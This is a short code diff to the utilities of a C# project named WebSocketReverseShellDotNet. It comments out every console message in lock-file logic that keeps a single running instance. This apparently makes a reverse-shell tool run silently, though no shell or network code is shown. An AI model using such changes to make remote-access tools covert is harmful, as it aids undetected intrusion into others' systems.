@@ -25,13 +25,13 @@ namespace WebSocketReverseShellDotNet.utils
                 // check if the lock file changes within the last 10 seconds
                 if (!CheckFileChanges(3, 250))
                 {
-                    Console.WriteLine("Starting lock File");
+                    /*Console.WriteLine("Starting lock File");*/
                     StartLock();
  
                 }
                 else
                 {
-                    Console.WriteLine("lock File is running");
+                    /*Console.WriteLine("lock File is running");*/
 
                     Environment.Exit(0);
                 }
@@ -39,7 +39,7 @@ namespace WebSocketReverseShellDotNet.utils
             }
             catch (Exception e)
             {
-                Console.WriteLine(e.Message);
+                /*Console.WriteLine(e.Message);*/
             }
 
         }
@@ -90,12 +90,12 @@ namespace WebSocketReverseShellDotNet.utils
 
             if (fileExists)
             {
-                Console.WriteLine("The file exists.");
+                /*Console.WriteLine("The file exists.");*/
             }
             else
             {
                 File.WriteAllText(path, "File content");
-                Console.WriteLine("The file does not exist.");
+                /*Console.WriteLine("The file does not exist.");*/
             }
         }
         
@@ -110,7 +110,7 @@ namespace WebSocketReverseShellDotNet.utils
             {
                 // Write the number to the file, overriding existing content
                 File.WriteAllText(path, number);
-                Console.WriteLine("Number written to file: " + number);
+                /*Console.WriteLine("Number written to file: " + number);*/
             }
             catch (IOException e)
             {
@@ -149,7 +149,7 @@ namespace WebSocketReverseShellDotNet.utils
             }
             catch (Exception e)
             {
-                Console.Error.WriteLine("Error checking file changes: " + e.Message);
+                /*Console.Error.WriteLine("Error checking file changes: " + e.Message);*/
             }
 
             return false; // File did not change within the specified number of checks
